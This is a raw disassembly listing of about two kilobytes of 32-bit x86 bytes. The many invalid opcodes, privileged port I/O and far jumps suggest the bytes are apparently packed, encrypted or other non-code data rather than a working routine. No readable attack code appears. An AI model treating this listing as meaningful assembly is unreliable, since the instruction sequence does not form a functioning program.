  41e6ab:	sbb    eax,0xf381d961
  41e6b0:	xchg   ebp,eax
  41e6b1:	(bad)  
  41e6b2:	ds push eax
  41e6b4:	push   0xffffffa1
  41e6b6:	pop    eax
  41e6b7:	fdivr  QWORD PTR [ecx-0x61fcbd0c]
  41e6bd:	(bad)  
  41e6be:	jle    0x41e6c6
  41e6c0:	jecxz  0x41e695
  41e6c2:	imul   ecx,ebx,0xffffff95
  41e6c5:	(bad)  
  41e6c6:	loopne 0x41e659
  41e6c8:	push   eax
  41e6c9:	jbe    0x41e718
  41e6cb:	retf   0x7cc4
  41e6ce:	or     DWORD PTR [ebx],ebp
  41e6d0:	fs adc al,0xc7
  41e6d3:	popa   
  41e6d4:	lahf   
  41e6d5:	mov    cl,BYTE PTR [edx+ecx*4-0xb423770]
  41e6dc:	jl     0x41e6ac
  41e6de:	xor    al,0xd6
  41e6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e1:	xlat   BYTE PTR ds:[ebx]
  41e6e2:	retf   
  41e6e3:	inc    ebx
  41e6e4:	cld    
  41e6e5:	or     esp,DWORD PTR [edi+ebx*2]
  41e6e8:	sar    DWORD PTR [eax+0x12],cl
  41e6eb:	sbb    al,0xab
  41e6ed:	dec    eax
  41e6ee:	pop    es
  41e6ef:	stos   DWORD PTR es:[edi],eax
  41e6f0:	ins    BYTE PTR es:[edi],dx
  41e6f1:	sub    eax,0xe5c21c15
  41e6f6:	jbe    0x41e678
  41e6f8:	loopne 0x41e70f
  41e6fa:	outs   dx,DWORD PTR ds:[esi]
  41e6fb:	sti    
  41e6fc:	dec    ebp
  41e6fd:	lods   al,BYTE PTR ds:[esi]
  41e6fe:	aam    0xbb
  41e700:	xchg   ecx,eax
  41e701:	and    eax,0xeb7f70ec
  41e706:	test   eax,0xe8c016e1
  41e70b:	and    eax,0x8282d472
  41e710:	loop   0x41e790
  41e712:	mov    fs,WORD PTR ds:0x55cf15e2
  41e718:	push   ebp
  41e719:	idiv   DWORD PTR [ebx-0x26]
  41e71c:	je     0x41e75a
  41e71e:	xor    ch,cl
  41e720:	scas   eax,DWORD PTR es:[edi]
  41e721:	add    BYTE PTR [edx-0x39],dl
  41e724:	push   edx
  41e725:	or     edx,DWORD PTR [ebx]
  41e727:	jmp    0xb452:0xafa0bcef
  41e72e:	aas    
  41e72f:	aas    
  41e730:	hlt    
  41e731:	push   ecx
  41e732:	pop    eax
  41e733:	(bad)  
  41e734:	sub    bl,BYTE PTR [ebx+0x65]
  41e737:	and    edx,DWORD PTR [edx+0x2654bcd7]
  41e73d:	das    
  41e73e:	ss dec ebx
  41e740:	add    edx,esp
  41e742:	call   0xa22e04f7
  41e747:	jmp    0x8a72dc3a
  41e74c:	mov    ah,BYTE PTR [edx-0x5c]
  41e74f:	add    eax,0x7b9534bb
  41e754:	dec    edx
  41e755:	mov    ebp,0xc6dd1f8b
  41e75a:	cmp    BYTE PTR [ebp+esi*8-0x3b950f33],cl
  41e761:	imul   esi,DWORD PTR [edx-0x2f],0xf11c7b65
  41e768:	outs   dx,BYTE PTR ds:[esi]
  41e769:	in     al,dx
  41e76a:	inc    ebx
  41e76b:	xlat   BYTE PTR ds:[ebx]
  41e76c:	adc    edx,DWORD PTR [edx-0xab3b67c]
  41e772:	outs   dx,DWORD PTR ds:[esi]
  41e773:	xor    al,0xf3
  41e775:	pop    es
  41e776:	sbb    bl,BYTE PTR [esi+0x11]
  41e779:	std    
  41e77a:	sbb    esi,ebp
  41e77c:	call   0x89da:0xfd9795c8
  41e783:	cmp    ebp,DWORD PTR [ecx+0x16224ef0]
  41e789:	in     eax,dx
  41e78a:	push   cs
  41e78b:	cmc    
  41e78c:	fwait
  41e78d:	int    0x2c
  41e78f:	jo     0x41e7cd
  41e791:	sub    edx,DWORD PTR [edi+0x3b]
  41e794:	mov    bl,cl
  41e796:	out    0xf2,al
  41e798:	jbe    0x41e7a9
  41e79a:	aas    
  41e79b:	shr    DWORD PTR [edx-0x7f21da0d],cl
  41e7a1:	test   al,0x2b
  41e7a3:	aam    0xd6
  41e7a5:	jbe    0x41e77c
  41e7a7:	sti    
  41e7a8:	cmp    ch,BYTE PTR [ecx+0x67]
  41e7ab:	add    BYTE PTR [ebp-0x64],dh
  41e7ae:	and    ah,al
  41e7b0:	mov    esp,0xbd2d740
  41e7b5:	test   esp,eax
  41e7b7:	jmp    0x3183dd4a
  41e7bc:	leave  
  41e7bd:	mov    al,gs:0x8d072f1
  41e7c3:	repz or DWORD PTR [esi+0x2e],0x9ef2ce00
  41e7cb:	or     al,0xc0
  41e7cd:	fcomp  QWORD PTR [ebp-0x4647ad61]
  41e7d3:	idiv   DWORD PTR [edx+0x53fabdb9]
  41e7d9:	ret    0x9df
  41e7dc:	xchg   dh,ch
  41e7de:	push   ecx
  41e7df:	nop
  41e7e0:	fild   QWORD PTR [ecx+0x330b21c2]
  41e7e6:	inc    esi
  41e7e7:	test   DWORD PTR [edi+ecx*4-0x18ce850],edx
  41e7ee:	outs   dx,DWORD PTR ds:[esi]
  41e7ef:	rol    BYTE PTR [eax],1
  41e7f1:	push   eax
  41e7f2:	jno    0x41e851
  41e7f4:	mov    BYTE PTR [eax+0xf],al
  41e7f7:	es or  eax,0x8b78bf19
  41e7fd:	inc    esp
  41e7fe:	or     al,0x44
  41e800:	or     al,0x49
  41e802:	rol    DWORD PTR [edi+edx*4],cl
  41e805:	xor    WORD PTR [ecx+0x31],bp
  41e809:	dec    esp
  41e80a:	in     eax,dx
  41e80b:	bound  esp,QWORD PTR [ebx-0x7ea2957]
  41e811:	jbe    0x41e816
  41e813:	jo     0x41e821
  41e815:	pop    ss
  41e816:	call   0xabb4cf57
  41e81b:	cmp    cl,BYTE PTR [edx+0x45]
  41e81e:	ret    
  41e81f:	jne    0x41e86a
  41e821:	mov    DWORD PTR [eax-0x15ecad78],ebp
  41e827:	ds dec ebx
  41e829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e82a:	loop   0x41e83b
  41e82c:	fucomp st(7)
  41e82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e82f:	push   ebx
  41e830:	repz jg 0x41e86f
  41e833:	fcom   QWORD PTR [ebp-0x4f]
  41e836:	mov    esp,0x77877102
  41e83b:	sbb    bl,BYTE PTR [eax+0x43bdfa68]
  41e841:	jnp    0x41e7cb
  41e843:	pushf  
  41e844:	push   ds
  41e845:	ss mov dl,0xce
  41e848:	call   0xdf7f80ef
  41e84d:	repz call 0x569834d
  41e853:	out    dx,al
  41e854:	loop   0x41e8b3
  41e856:	cwde   
  41e857:	int    0x43
  41e859:	xchg   DWORD PTR [ecx-0x2efcfeba],esp
  41e85f:	js     0x41e7f7
  41e861:	fnstcw WORD PTR [esi-0x66]
  41e864:	jmp    0x1489ced
  41e869:	sbb    al,0xb5
  41e86b:	test   al,0x7
  41e86d:	loopne 0x41e81b
  41e86f:	mov    ss,esp
  41e871:	xor    BYTE PTR [eax+0x2026d0a2],cl
  41e877:	xchg   esp,eax
  41e878:	in     al,dx
  41e879:	loope  0x41e8aa
  41e87b:	out    0xe8,al
  41e87d:	cld    
  41e87e:	cli    
  41e87f:	adc    al,0x9e
  41e881:	ins    BYTE PTR es:[edi],dx
  41e882:	pop    esi
  41e883:	dec    edi
  41e884:	mov    ecx,0xb333148
  41e889:	jae    0x41e8b7
  41e88b:	xor    eax,0x45ba6e4c
  41e890:	cwde   
  41e891:	out    0xca,eax
  41e893:	out    dx,eax
  41e894:	mov    DWORD PTR [ebp+0x37f33b9],ecx
  41e89a:	mov    edx,edx
  41e89c:	int3   
  41e89d:	xchg   esp,eax
  41e89e:	aas    
  41e89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8a0:	outs   dx,BYTE PTR ds:[esi]
  41e8a1:	jecxz  0x41e8e4
  41e8a3:	add    al,0xc3
  41e8a5:	push   esp
  41e8a6:	stos   DWORD PTR es:[edi],eax
  41e8a7:	retf   0x771e
  41e8aa:	pusha  
  41e8ab:	inc    eax
  41e8ac:	popa   
  41e8ad:	jb     0x41e845
  41e8af:	or     ebp,esi
  41e8b1:	jbe    0x41e86e
  41e8b3:	test   eax,0xc0817fab
  41e8b8:	xchg   esi,eax
  41e8b9:	pop    ss
  41e8ba:	xor    ebp,DWORD PTR [edi+eiz*1-0x48681d5]
  41e8c1:	add    DWORD PTR [esi+0x43cda564],ecx
  41e8c7:	push   0xfffffffb
  41e8c9:	retf   
  41e8ca:	jns    0x41e869
  41e8cc:	sub    dl,BYTE PTR [ebp-0x1c391dbe]
  41e8d2:	or     esp,edx
  41e8d4:	(bad)  
  41e8d5:	call   0xb555393d
  41e8da:	or     cl,bl
  41e8dc:	add    al,0x6c
  41e8de:	mov    ebp,0xb9f4c50c
  41e8e3:	in     eax,0x9c
  41e8e5:	mov    ebx,DWORD PTR [ebx-0x373cc359]
  41e8eb:	test   eax,0xe87479b9
  41e8f0:	(bad)  [esi]
  41e8f2:	pop    esp
  41e8f3:	inc    edx
  41e8f4:	mov    bh,0x54
  41e8f6:	cmp    DWORD PTR [eax-0x52b4db9e],eax
  41e8fc:	int    0xe0
  41e8fe:	xchg   edx,eax
  41e8ff:	je     0x41e886
  41e901:	fs (bad) 
  41e903:	aam    0x6f
  41e905:	js     0x41e936
  41e907:	cdq    
  41e908:	scas   al,BYTE PTR es:[edi]
  41e909:	sub    BYTE PTR [ebx-0x74309909],ah
  41e90f:	and    eax,0x11792d53
  41e914:	cmp    DWORD PTR [esi-0x157330a9],0x67
  41e91b:	inc    edi
  41e91c:	aad    0x8e
  41e91e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e91f:	into   
  41e920:	repnz lods al,BYTE PTR ds:[esi]
  41e922:	jbe    0x41e8dd
  41e924:	pop    edx
  41e925:	retf   
  41e926:	stos   BYTE PTR es:[edi],al
  41e927:	jmp    0x204e:0x4d6e3b74
  41e92e:	xrelease mov BYTE PTR [ecx],bh
  41e931:	inc    ebp
  41e932:	lock add DWORD PTR [ecx],0x44
  41e936:	jmp    0xc37a:0xd69182e2
  41e93d:	xor    DWORD PTR [esi-0x674edc5],ebp
  41e943:	and    ecx,esp
  41e945:	sub    BYTE PTR [ecx+esi*4],bh
  41e948:	js     0x41e9af
  41e94a:	fsubr  st(4),st
  41e94c:	je     0x41e9a1
  41e94e:	pop    ecx
  41e94f:	or     cl,BYTE PTR [eax+0x33e03a0]
  41e955:	fadd   QWORD PTR [esi-0x46a5efff]
  41e95b:	adc    ah,BYTE PTR [esi+ebp*4]
  41e95e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e95f:	jmp    0xbecb2439
  41e964:	pushf  
  41e965:	push   edi
  41e966:	inc    ecx
  41e967:	and    BYTE PTR [esp+ecx*8],dl
  41e96a:	jge    0x41e99d
  41e96c:	mov    esp,0x2b34337e
  41e971:	inc    edx
  41e972:	dec    ebp
  41e973:	pushf  
  41e974:	clc    
  41e975:	aas    
  41e976:	mov    edi,0x27ba2869
  41e97b:	mov    edx,0xa77a2ac1
  41e980:	in     al,0x36
  41e982:	lock (bad) 
  41e984:	enter  0x8ba3,0x45
  41e988:	das    
  41e989:	inc    ecx
  41e98a:	jo     0x41e9c8
  41e98c:	cli    
  41e98d:	push   eax
  41e98e:	bound  esi,QWORD PTR [eax+0x70]
  41e991:	push   ebx
  41e992:	jne    0x41e971
  41e994:	dec    ebp
  41e995:	mov    al,0x11
  41e997:	int    0x61
  41e999:	call   0x4ec5:0x8b5e8691
  41e9a0:	ret    0xd746
  41e9a3:	jno    0x41e936
  41e9a5:	push   es
  41e9a6:	pop    eax
  41e9a7:	lea    eax,ds:0x7b9b9deb
  41e9ad:	icebp  
  41e9ae:	and    al,0x5a
  41e9b0:	inc    edi
  41e9b1:	or     dl,0xa7
  41e9b4:	shr    DWORD PTR [ebp+0x2b540dae],0x7e
  41e9bb:	xchg   esi,edi
  41e9bd:	(bad)  
  41e9be:	xlat   BYTE PTR ds:[ebx]
  41e9bf:	fdivp  st(4),st
  41e9c1:	mov    ds:0x15338272,eax
  41e9c6:	mov    al,0x98
  41e9c8:	xchg   DWORD PTR fs:[edi+0x3c],ebp
  41e9cc:	clc    
  41e9cd:	fmul   DWORD PTR [edx+0x7]
  41e9d0:	sub    eax,0x566f4573
  41e9d5:	mov    al,0xf6
  41e9d7:	jno    0x41e9e1
  41e9d9:	and    BYTE PTR [ecx+0x564c4bde],bl
  41e9df:	(bad)  
  41e9e0:	mov    al,0x4b
  41e9e2:	inc    edx
  41e9e3:	stos   BYTE PTR es:[edi],al
  41e9e4:	push   ebp
  41e9e5:	pop    ecx
  41e9e6:	out    0x21,al
  41e9e8:	scas   eax,DWORD PTR es:[edi]
  41e9e9:	pop    ebp
  41e9ea:	dec    ecx
  41e9eb:	mov    esi,0x84d09ee2
  41e9f0:	cli    
  41e9f1:	nop
  41e9f2:	aad    0x82
  41e9f4:	dec    edx
  41e9f5:	imul   edi,DWORD PTR [ebx+0x6b],0x951ff014
  41e9fc:	scas   eax,DWORD PTR es:[edi]
  41e9fd:	push   cs
  41e9fe:	and    BYTE PTR [edx],cl
  41ea00:	push   ss
  41ea01:	dec    eax
  41ea02:	call   0x93ec8f88
  41ea07:	and    eax,0xd72d7369
  41ea0c:	pop    ebp
  41ea0d:	test   eax,0x51e42470
  41ea12:	in     al,0xd9
  41ea14:	jbe    0x41ea22
  41ea16:	mov    esp,0x167e77c
  41ea1b:	int3   
  41ea1c:	pop    esi
  41ea1d:	out    dx,eax
  41ea1e:	out    dx,eax
  41ea1f:	popf   
  41ea20:	push   0xb27b1bb3
  41ea25:	mov    ds:0x953f9147,eax
  41ea2a:	jbe    0x41e9fe
  41ea2c:	enter  0x9a77,0xef
  41ea30:	mov    ebp,0x5bd28821
  41ea35:	mov    cl,cl
  41ea37:	retf   0x61d5
  41ea3a:	mov    bl,0x8e
  41ea3c:	out    0xc0,eax
  41ea3e:	retf   0xbf5f
  41ea41:	cmp    al,ah
  41ea43:	xor    DWORD PTR ds:0x2a8983e0,0xffffffb3
  41ea4a:	test   al,0xf6
  41ea4c:	add    esp,DWORD PTR [ebx+0x42]
  41ea4f:	mov    esi,0x8a48493f
  41ea54:	mov    eax,ds:0x30523ab1
  41ea59:	test   al,0xb5
  41ea5b:	push   ds
  41ea5c:	pushf  
  41ea5d:	es xor al,0xdb
  41ea60:	push   ebp
  41ea61:	cdq    
  41ea62:	mov    eax,ebx
  41ea64:	fidiv  WORD PTR [ebp-0x16]
  41ea67:	xchg   esp,eax
  41ea68:	push   ds
  41ea69:	fisub  WORD PTR [edx-0x2d]
  41ea6c:	dec    esi
  41ea6d:	dec    ecx
  41ea6e:	test   BYTE PTR [esi-0x32abca98],bh
  41ea74:	pop    es
  41ea75:	pop    eax
  41ea76:	or     esp,edx
  41ea78:	add    al,0x65
  41ea7a:	loopne 0x41ea80
  41ea7c:	in     eax,0x3a
  41ea7e:	fcmove st,st(3)
  41ea80:	add    cl,BYTE PTR [ecx-0x1b]
  41ea83:	add    BYTE PTR [edi+0x4ed0bc05],ch
  41ea89:	fistp  WORD PTR [edi+0x4c]
  41ea8c:	xchg   DWORD PTR [ecx],ebx
  41ea8e:	mov    edi,0xdc12c55b
  41ea93:	or     BYTE PTR [esi-0x26be4eec],ah
  41ea99:	mov    ch,0xbb
  41ea9b:	add    dl,dh
  41ea9d:	fldenv [ebp-0x25]
  41eaa0:	sbb    eax,0x5577214f
  41eaa5:	xor    al,0x48
  41eaa7:	arpl   di,bp
  41eaa9:	setg   BYTE PTR [ebp-0x5b2720bb]
  41eab0:	mov    ?,WORD PTR [eax+0x52df19b8]
  41eab6:	mov    ds:0x8176ca02,al
  41eabb:	push   0x2aaffefc
  41eac0:	hlt    
  41eac1:	sub    DWORD PTR [edx-0x58cd7538],edx
  41eac7:	bsf    esi,DWORD PTR [ebx-0x1]
  41eacb:	ret    0x66
  41eace:	std    
  41eacf:	rol    DWORD PTR ds:0x5569f915,cl
  41ead5:	xchg   esp,eax
  41ead6:	(bad)  
  41ead7:	mov    cl,0x2c
  41ead9:	xor    al,dh
  41eadb:	inc    edx
  41eadc:	ret    0x5201
  41eadf:	sbb    eax,0xdc04cdb8
  41eae4:	sub    DWORD PTR [edx+0x3ff234b2],ebp
  41eaea:	cdq    
  41eaeb:	jne    0x41ea80
  41eaed:	ins    DWORD PTR es:[edi],dx
  41eaee:	(bad)  
  41eaef:	and    esi,edi
  41eaf1:	inc    esp
  41eaf2:	or     eax,0x6a3f2173
  41eaf7:	js     0x41eb0e
  41eaf9:	mov    ds:0xf6adc2a4,eax
  41eafe:	xlat   BYTE PTR ds:[ebx]
  41eaff:	fmul   DWORD PTR [ebx+edi*4+0x39]
  41eb03:	dec    DWORD PTR [ecx+eiz*8-0x4b]
  41eb07:	jns    0x41eb08
  41eb09:	xor    DWORD PTR [edi+0x74a30287],edi
  41eb0f:	dec    ebp
  41eb10:	mov    esp,0xcd44830e
  41eb15:	in     al,0x9a
  41eb17:	pop    esi
  41eb18:	xor    eax,0x1d1464aa
  41eb1d:	in     eax,0xc7
  41eb1f:	ficomp DWORD PTR ds:0xd4275145
  41eb25:	xchg   DWORD PTR [ecx-0x6f],ecx
  41eb28:	xor    eax,0x8fdce1fe
  41eb2d:	inc    ebp
  41eb2e:	pop    ebx
  41eb2f:	nop
  41eb30:	pop    eax
  41eb31:	pop    ecx
  41eb32:	scas   eax,DWORD PTR es:[edi]
  41eb33:	test   eax,0x9b18c57e
  41eb38:	cmp    DWORD PTR [ecx-0x60117d93],0x5f
  41eb3f:	dec    ebx
  41eb40:	retf   0xf515
  41eb43:	retf   0x76f1
  41eb46:	mov    gs,edx
  41eb48:	push   esp
  41eb49:	das    
  41eb4a:	popf   
  41eb4b:	xor    esp,DWORD PTR [edx]
  41eb4d:	jl     0x41eaeb
  41eb4f:	and    eax,0xf38d355e
  41eb54:	pushf  
  41eb55:	test   DWORD PTR ds:0xf064a457,edx
  41eb5b:	jmp    0xa856467a
  41eb60:	js     0x41eb5d
  41eb62:	(bad)  
  41eb63:	int3   
  41eb64:	mov    ebx,0xf0f5aeef
  41eb69:	push   ss
  41eb6a:	sub    BYTE PTR [ebp+0x73],bh
  41eb6d:	cdq    
  41eb6e:	inc    edx
  41eb6f:	push   0x69
  41eb71:	ds jge 0x41eb23
  41eb74:	scas   eax,DWORD PTR es:[edi]
  41eb75:	lods   eax,DWORD PTR ds:[esi]
  41eb76:	add    eax,0x4fecfc82
  41eb7b:	push   esp
  41eb7c:	popa   
  41eb7d:	mov    ecx,0x32492b9b
  41eb82:	cmp    DWORD PTR [edi],eax
  41eb84:	or     al,0xe8
  41eb86:	adc    ebx,DWORD PTR [eax]
  41eb88:	fnstsw WORD PTR [edi+0x30]
  41eb8b:	mov    dl,0xb9
  41eb8d:	mov    DWORD PTR [eax-0x66bcfdab],ebx
  41eb93:	iret   
  41eb94:	inc    ebp
  41eb95:	or     BYTE PTR [edx],al
  41eb97:	add    eax,DWORD PTR [ecx*8+0x60bb32ac]
  41eb9e:	repz adc esi,ebx
  41eba1:	pop    esp
  41eba2:	daa    
  41eba3:	aas    
  41eba4:	adc    dl,BYTE PTR [esi+0x78]
  41eba7:	pop    edx
  41eba8:	out    dx,eax
  41eba9:	(bad)  
  41ebaa:	dec    ebx
  41ebab:	inc    edx
  41ebac:	xor    BYTE PTR [ecx-0x6c],ch
  41ebaf:	(bad)  [esp+ebp*1-0x7ebf700e]
  41ebb6:	stos   DWORD PTR es:[edi],eax
  41ebb7:	jmp    0x41eba7
  41ebb9:	cli    
  41ebba:	pop    ebx
  41ebbb:	cmc    
  41ebbc:	mov    edx,0xa70fc58
  41ebc1:	scas   eax,DWORD PTR es:[edi]
  41ebc2:	cmp    eax,0x8a07344e
  41ebc7:	mov    ebp,0x8f6349a7
  41ebcc:	mov    ah,0x54
  41ebce:	js     0x41ec33
  41ebd0:	not    ch
  41ebd2:	pop    edi
  41ebd3:	aaa    
  41ebd4:	mov    eax,ds:0xaad25f2b
  41ebd9:	cmp    al,0xbf
  41ebdb:	daa    
  41ebdc:	mov    eax,0xcf614b13
  41ebe1:	xchg   ecx,eax
  41ebe2:	enter  0xf180,0x8c
  41ebe6:	out    0xd7,al
  41ebe8:	mov    ebp,0x5d629fd0
  41ebed:	imul   ecx,DWORD PTR [edx],0x2e14f437
  41ebf3:	mov    ch,dh
  41ebf5:	mov    ?,esp
  41ebf7:	call   FWORD PTR [ecx+0x3d]
  41ebfa:	push   esp
  41ebfb:	jle    0x41ebb6
  41ebfd:	je     0x41ebdd
  41ebff:	mov    esp,0x9665d1c
  41ec04:	out    0x59,eax
  41ec06:	cld    
  41ec07:	ins    BYTE PTR es:[edi],dx
  41ec08:	fwait
  41ec09:	xchg   BYTE PTR [ecx-0x24ade97],ah
  41ec0f:	jmp    0xdae4da3d
  41ec14:	sub    DWORD PTR [eax+0x720608a9],edx
  41ec1a:	and    al,0xf5
  41ec1c:	jecxz  0x41ec1c
  41ec1e:	pusha  
  41ec1f:	aaa    
  41ec20:	xor    esi,esp
  41ec22:	popf   
  41ec23:	repnz mov cl,0x8f
  41ec26:	adc    eax,0xe061178c
  41ec2b:	in     al,dx
  41ec2c:	in     al,0x90
  41ec2e:	iret   
  41ec2f:	dec    ebx
  41ec30:	(bad)  
  41ec31:	jmp    0x5af5:0xd0854829
  41ec38:	gs dec ecx
  41ec3a:	sti    
  41ec3b:	mov    ebp,0xe6649b25
  41ec40:	js     0x41ebc5
  41ec42:	and    eax,0x720113be
  41ec47:	mov    ds:0x7197dcd7,al
  41ec4c:	push   ds
  41ec4d:	and    al,0x3f
  41ec4f:	shl    DWORD PTR [eax],cl
  41ec51:	pushf  
  41ec52:	sbb    al,0x4
  41ec54:	(bad)  
  41ec55:	stc    
  41ec56:	arpl   bx,cx
  41ec58:	ret    0x2f8
  41ec5b:	repz mov cl,0xf5
  41ec5e:	inc    ecx
  41ec5f:	jge    0x41ec1c
  41ec61:	(bad)  [edi]
  41ec63:	call   0x3cdd:0xea6b170a
  41ec6a:	iret   
  41ec6b:	sbb    eax,0x66a2b212
  41ec70:	mov    ecx,0x5c6e1256
  41ec75:	mov    dh,0xf2
  41ec77:	cmp    eax,0x5e4d56b8
  41ec7c:	xor    DWORD PTR [ecx-0x22d4e791],eax
  41ec82:	fistp  QWORD PTR [esi]
  41ec84:	sub    dh,ah
  41ec86:	add    BYTE PTR ds:0x319ea1f8,0x69
  41ec8d:	mov    DWORD PTR [ecx+0x1],esi
  41ec90:	test   al,0xa2
  41ec92:	mov    al,ds:0x94a4b109
  41ec97:	pop    esi
  41ec98:	(bad)  
  41ec99:	lods   al,BYTE PTR ds:[esi]
  41ec9a:	xor    eax,0x7d2a95d
  41ec9f:	js     0x41ec6c
  41eca1:	jmp    0x9469:0x3ee6da7e
  41eca8:	out    0x8c,al
  41ecaa:	jg     0x41ec90
  41ecac:	(bad)  
  41ecae:	jge    0x41ec98
  41ecb0:	or     eax,0xfc521334
  41ecb5:	xlat   BYTE PTR ds:[ebx]
  41ecb6:	push   ebp
  41ecb7:	xlat   BYTE PTR ds:[ebx]
  41ecb8:	mov    BYTE PTR [edi+0x3a0a425e],cl
  41ecbe:	mov    fs,WORD PTR [eax-0x67bafd9b]
  41ecc4:	or     ebx,edi
  41ecc6:	scas   al,BYTE PTR es:[edi]
  41ecc7:	mov    ecx,0xf72da4e2
  41eccc:	ja     0x41eccc
  41ecce:	imul   ebp,DWORD PTR [ebx],0xcb5325a
  41ecd4:	or     cl,BYTE PTR [edi+edx*2-0x31b91b8c]
  41ecdb:	(bad)  
  41ecdc:	repz bound ecx,QWORD PTR [edi+0x3e60477]
  41ece3:	jp     0x41ecf9
  41ece5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece6:	dec    eax
  41ece7:	dec    ebx
  41ece8:	jbe    0x41ec9b
  41ecea:	xor    ch,BYTE PTR [esi-0x6a671920]
  41ecf0:	dec    esi
  41ecf1:	jbe    0x41ecd7
  41ecf3:	shl    BYTE PTR [edx],cl
  41ecf5:	mov    ecx,0xa1dd39ef
  41ecfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecfb:	nop
  41ecfc:	xchg   esi,eax
  41ecfd:	push   edx
  41ecfe:	shl    DWORD PTR [eax-0x54fb1445],0xd8
  41ed05:	ins    BYTE PTR es:[edi],dx
  41ed06:	jmp    0x41ed67
  41ed08:	jecxz  0x41ed18
  41ed0a:	mov    eax,0x82719439
  41ed0f:	jge    0x41ed03
  41ed11:	adc    BYTE PTR [esi],cl
  41ed13:	pop    es
  41ed14:	fs jne 0x41ecfb
  41ed17:	loopne 0x41ecd3
  41ed19:	aaa    
  41ed1a:	aaa    
  41ed1b:	mov    ebx,0x850668f6
  41ed20:	sub    DWORD PTR [eax+0x12],0xffffffed
  41ed24:	and    al,0x49
  41ed26:	sub    eax,0xccff7b85
  41ed2b:	fstp   QWORD PTR [ebx-0x32046490]
  41ed31:	adc    edx,DWORD PTR [esi]
  41ed33:	push   0x19e223fa
  41ed38:	mov    esi,0x6871ca22
  41ed3d:	mov    edi,0x284a5e81
  41ed42:	and    dl,BYTE PTR [ecx-0x261ae33c]
  41ed48:	jg     0x41ecfe
  41ed4a:	dec    edi
  41ed4b:	inc    ebx
  41ed4c:	xor    bl,dl
  41ed4e:	(bad)  
  41ed4f:	sub    BYTE PTR [ebx],cl
  41ed51:	sbb    DWORD PTR [ebp+0x4c21e3bb],0xb202b48a
  41ed5b:	and    DWORD PTR [esi],0x71d21652
  41ed61:	mov    edx,0x4de0f320
  41ed66:	fiadd  WORD PTR [edx+0xc]
  41ed69:	add    edi,DWORD PTR [edi]
  41ed6b:	cmp    dh,BYTE PTR [edx*1+0x7fa1b353]
  41ed72:	int3   
  41ed73:	dec    edx
  41ed74:	mov    al,ds:0x6ce6dc71
  41ed79:	not    DWORD PTR [ebp-0x7d]
  41ed7c:	add    DWORD PTR [esp+ebp*2],esp
  41ed7f:	jecxz  0x41ed57
  41ed81:	sar    DWORD PTR [ecx+0x73],0x4f
  41ed85:	pushf  
  41ed86:	icebp  
  41ed87:	popf   
  41ed88:	mov    fs,ebp
  41ed8a:	cmp    ecx,ecx
  41ed8c:	jecxz  0x41edcb
  41ed8e:	aam    0xcb
  41ed90:	data16 (bad) [ebx]
  41ed93:	sbb    ah,dh
  41ed95:	jbe    0x41edef
  41ed97:	jbe    0x41edee
  41ed99:	(bad)  
  41ed9a:	cli    
  41ed9b:	call   0xd3a0:0x5d429ac9
  41eda2:	inc    bx
  41eda4:	aad    0x1a
  41eda6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda7:	test   bl,0xd
  41edaa:	xchg   ecx,eax
  41edab:	sbb    BYTE PTR ds:0xae8a9a9e,bl
  41edb1:	sbb    esi,ebp
  41edb3:	mov    eax,ds:0xda48ef83
  41edb8:	push   edx
  41edb9:	inc    edi
  41edba:	dec    ebx
  41edbb:	jnp    0x41ed3d
  41edbd:	pop    es
  41edbe:	push   ss
  41edbf:	in     al,dx
  41edc0:	xchg   esp,eax
  41edc1:	mov    eax,edi
  41edc3:	aad    0x8
  41edc5:	pop    ecx
  41edc6:	xor    BYTE PTR [ebx],dh
  41edc8:	cdq    
  41edc9:	cmp    DWORD PTR [eax+eiz*1-0xa],edx
  41edcd:	lods   al,BYTE PTR ds:[esi]
  41edce:	fild   DWORD PTR [edi-0x6c]
  41edd1:	fs dec edx
  41edd3:	lds    esp,FWORD PTR [edi]
  41edd5:	push   es
  41edd6:	aaa    
  41edd7:	or     esi,DWORD PTR [eiz*4+0x691d84b1]
  41edde:	retf   
  41eddf:	xchg   esi,eax
  41ede0:	xchg   esi,eax
  41ede1:	add    DWORD PTR [eax],ebp
  41ede3:	jge    0x41ee0d
  41ede5:	imul   ecx,DWORD PTR [ecx],0xffffffa3
  41ede8:	dec    esi
  41ede9:	pop    ds
  41edea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edeb:	ret    
  41edec:	pushf  
  41eded:	xchg   esp,eax
  41edee:	cs adc al,0x36
  41edf1:	enter  0x3f28,0xe4
  41edf5:	call   0x85da:0xc05d88a
  41edfc:	rcl    DWORD PTR [eax],cl
  41edfe:	fcom   QWORD PTR fs:[ebx]
  41ee01:	into   
  41ee02:	push   edi
  41ee03:	mov    ah,0x4f
  41ee05:	mov    bh,dl
  41ee07:	cmp    DWORD PTR [edx+0x7b58a5db],esi
  41ee0d:	pop    esi
  41ee0e:	adc    DWORD PTR [ebx],esi
  41ee10:	jmp    0xa3b:0x2b1aed99
  41ee17:	ret    
  41ee18:	jmp    0x41edab
  41ee1a:	dec    ebx
  41ee1b:	jmp    0xa5a9a234
  41ee20:	push   edi
  41ee21:	dec    ecx
  41ee22:	pop    ds
  41ee23:	(bad)  
  41ee24:	test   BYTE PTR [eiz*1-0x79b86adc],0x75
  41ee2c:	imul   ecx,esp,0x24
  41ee2f:	iret   
  41ee30:	mov    cl,BYTE PTR [edx]
  41ee32:	pushf  
  41ee33:	add    eax,0x21083d1c
  41ee38:	ss repnz push ecx
  41ee3b:	or     eax,0xf57d07f1
  41ee40:	jmp    0xf9dd:0x161920e5
  41ee47:	cli    
  41ee48:	int3   
  41ee49:	stc    
  41ee4a:	ret    
  41ee4b:	dec    ecx
  41ee4c:	cmp    BYTE PTR [ebp-0x13ae6250],cl
  41ee52:	scas   eax,DWORD PTR es:[edi]
  41ee53:	pop    ecx
  41ee54:	xor    cl,BYTE PTR ds:0x6b22cc8b
  41ee5a:	push   eax
  41ee5b:	pushf  
  41ee5c:	mov    DWORD PTR [edx],eax
  41ee5e:	out    0x54,eax
